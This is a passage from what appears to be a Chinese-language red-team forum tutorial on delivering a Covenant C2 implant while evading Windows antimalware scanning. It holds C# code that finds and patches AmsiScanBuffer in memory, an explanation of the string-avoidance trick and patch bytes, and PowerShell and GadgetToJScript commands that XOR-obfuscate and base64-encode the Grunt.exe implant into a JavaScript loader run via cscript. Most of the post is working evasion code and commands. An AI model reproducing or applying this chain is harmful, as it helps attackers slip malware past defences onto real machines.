            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);
        }

        private static IntPtr FindAddress(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;

                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }
    }
}
```

注：第一:代码中不能直接出现`AmsiScanBuffer`的字符串，否则会被amsi识别，所以替换成`DllCanUnloadNow`

用egg hunt的方式，以`DllCanUnloadNow`的函数地址为基址寻找AmsiScanBuffer函数的地址，再patch

第二:因为微软的更新，使得对`.net  Assembly.load`的程序集扫描结果必须返回一个有效值，所以替换为`0xb8,0x57,0x00,0x07,0x80`后再加上`return  0xC3`

编译一下

![image-20211119232115873](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-800276385dd87de41b69f1d2868e22cefeacb5ab.png)

执行一下

![image-20211119232136876](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9a0e4b8c82e2cdc78017fb23bc2ba5522119b95c.png)

上WinDbg调试看看是否成功 Bypass Amsi

File-Attach

![image-20211119232218285](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cf080b0bcc2424f4ce8ecfc09bf4143fb6617077.png)

定位到amsi 查看Patch是否成功

两者结合
----

以Grunt.exe作为例子

1.把exe读取到一个数组中

```php
[byte[]]$rawbytes = [System.IO.File]::ReadAllBytes("C:\Users\12550\Desktop\知识\项目学习\GadgetToJScript\GadgetToJScript-1.0\GadgetToJScript\bin\x64\Release\Grunt.exe")
```

2.查看exe的字符串大小

```php
$rawbytes.length
```

![image-20211119230129292](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d46d0f734a722ff2d6f102a81db2b25998285e41.png)

3.简单异或0x77

```php
for ($i = 0; $i -lt $rawbytes.Length; $i++){$rawbytes[$i] = $rawbytes[$i] -bxor 0x77}
```

![image-20211119230229026](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4119fc2e775eee699a83c9c3daccf836669506c2.png)

4.base64编码一哈 并复制到剪切板

```php
[System.Convert]::ToBase64String($rawbytes) | clip
```

![image-20211119230303563](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b977a43e7e3ae49c582db3281f2bfdef320c2e6c.png)

放到PatchAmsi.cs文件中

![image-20211119224900660](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7f40cdc05e2307d18d07daedbea644337e98eec.png)

注意这里的`Patch();`

![image-20211119230531276](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ff95d749b9c37ff53edf8a8e1ba189363ff0afd9.png)

![image-20211119230839529](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ea2b2d27337957154adc99023749b94674ff155f.png)

编译测试成功后命令行运行：

```php
GadgetToJScript.exe -w js -d System.Core.dll -f PatchASB.cs -o PatchASB
```

测试js文件，运行

```php
cscript matrix.js
```

ok！ 就到这里

总结
--

Covenant是一个`.NET`命令和控制框架，二次开发的可扩展性不比其他的C2差

分享者才是学习中最大的受益者！

希望可以帮到各位师傅